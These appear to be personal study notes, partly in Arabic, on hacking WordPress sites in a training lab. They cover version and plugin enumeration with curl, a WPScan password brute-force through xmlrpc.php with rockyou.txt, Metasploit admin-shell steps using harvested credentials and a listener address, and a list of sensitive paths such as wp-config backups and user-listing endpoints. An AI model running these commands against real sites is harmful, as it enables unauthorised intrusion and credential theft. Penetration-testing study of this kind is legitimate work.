WordPress File Structure:
	├── index.php
	├── license.txt
	├── readme.html
	├── wp-activate.php
	├── wp-admin
	├── wp-blog-header.php
	├── wp-comments-post.php
	├── wp-config.php
	├── wp-config-sample.php
	├── wp-content
	├── wp-cron.php
	├── wp-includes
	├── wp-links-opml.php
	├── wp-load.php
	├── wp-login.php
	├── wp-mail.php
	├── wp-settings.php
	├── wp-signup.php
	├── wp-trackback.php
	└── xmlrpc.php


Key WordPress Files:

	- index.php
	- license.txt
	- wp-activate.php
	- wp-admin
		-- /wp-admin/login.php
		-- /wp-admin/wp-login.php
		-- /login.php
		-- /wp-login.php
	- xmlrpc.php

WordPress Configuration File:
	- wp-config.php

Key WordPress Directories:

	- WP-Content
		-- index.php
		-- plugins
		-- themes
	- WP-Includes
		├── <SNIP>
		├── theme.php
		├── update.php
		├── user.php
		├── vars.php
		├── version.php
		├── widgets
		├── widgets.php
		├── wlwmanifest.xml
		├── wp-db.php
		└── wp-diff.php
----------------------------------------------------------------------
WordPress User Roles:
	
	- Administrator
	- Editor
	- Author
	- Contributor
	- Subscriber

----------------------------------------------------------------------
To Know A wordpress version:
	1) we can see a Meta in Source Code :
		we see like this:
			<link rel='https://api.w.org/' href='http://blog.inlanefreight.com/index.php/wp-json/' />
			<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog.inlanefreight.com/xmlrpc.php?rsd" />
			<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog.inlanefreight.com/wp-includes/wlwmanifest.xml" /> 
			<meta name="generator" content="WordPress 5.3.3" />

			Now We know the version

	2) we can see a CSS And Js Version in source code Like This :
		<link rel='stylesheet' id='transportex-style-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3' type='text/css' media='all' />
		<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'></script>
----------------------------------------------------------------------
Plugins and Themes Enumeration:
	- We Can Use This Command to get a plugins:
		-- curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
 
	- We Can Use This Command to get a themes:
		-- curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2

Note: ) To Know If The Plugin Active Or Not We Can Use Curl : 
	curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta

----------------------------------------------------------------------





Note: ) the best tool to hacking wordpress is a -> "WPscan" like this :

		1) - enumeration
			-- wpscan --url http://target.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>

		2) - If I have User and i need know the password -> I can use "wpscan" and "rockyou.txt"
			-- wpscan --password-attack xmlrpc -t 20 -U username1, username2 -P rockyou.txt --url http://target.com




Note:) If I have valid [username and password] -> i can use metasploit to attack the wordpress: the steps:)
	1) msfconsole
	2) search wp_admin
	3) use 0
	4) options
	5) -- set rhosts blog.inlanefreight.com
		-- set username admin
		-- set password Winter2020
		-- set lhost 10.10.16.8
		-- run









Important Pathes: 
	-- /wp-content/plugins/mail-masta
	-- /wp-json/wp/v2/users
	-- /wp-content/plugins/mail-masta/inc/campaign/count_of_send.php
	-- /xmlrpc.php
		-- if this the output: XML-RPC server accepts POST requests only.
			-- we can use this code to try a hacking: curl -X POST http://target/xmlrpc.php -d '<?xml version="1.0"?>
									<methodCall>
									  <methodName>system.listMethods</methodName>
									</methodCall>' -H "Content-Type: text/xml"





أقرأ الريتب ده : https://hossamshady.medium.com/advanced-level-for-wordpress-vulnerabilities-e93144e3a8f3

وده: https://medium.com/@keshavxplore/how-i-ethically-hacked-a-wordpress-site-in-10-minutes-using-wpscan-be5059c0c49a

وده:https://pwnb0y.medium.com/what-is-xmlrpc-php-file-and-how-to-exploit-it-bugbounty-a302e770ae59

وده:https://infosecwriteups.com/hacking-the-wordpress-sites-for-fun-and-profit-part-1-water-7ba474ced0f8

### ملفات تدور عليها :
1. /wp-login.php?action=register
2. /wp-admin/wp-login.php?action=register
3. /wp-admin/login.php?action=register
4. /wp-json/wp/v1/users
5. /wp-json/wp/v2/users
6. /wp-json/wp/v3/users
7. /wp-json/?rest_route=/wp/v3/users
8. /wp-json/?rest_route=/wp/v3/users/n
9. /index.php/?rest_route=/wp-json/wp/v3/users
10. /index.php/?rest_route=/wp/v3/users
11. /wp-content/uploads/wp-file-manager-pro/fm_backup
12. /wp-config.php.BAK
13. /wp-content/uploads/
14. /wp-content/UPLOADS/
15. /wp-content/UpLoAds/
16. /tox.ini
17. /author-sitemap.xml
18. /wp-content/debug.log
19. /wp-content/plugins/mail-masta
20. /wp-admin/login.php
21. /wp-admin/wp-login.php
22. /login.php
23. /wp-login.php
24. /wp-config.php
25. /wp-config.php_

### عشان نعرف البلاجنز اللي موجود بنستعمل الأمر ده:
curl -s -X GET http://example.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins*/' | cut -d"'" -f2*
>عشان نعرف الفيرجن بتاع الووردبريس برضو ممكن نبص علي الميتا في الهيدر فيه ميتا اسمه `generator`




### reports:


https://hackerone.com/reports/1784999








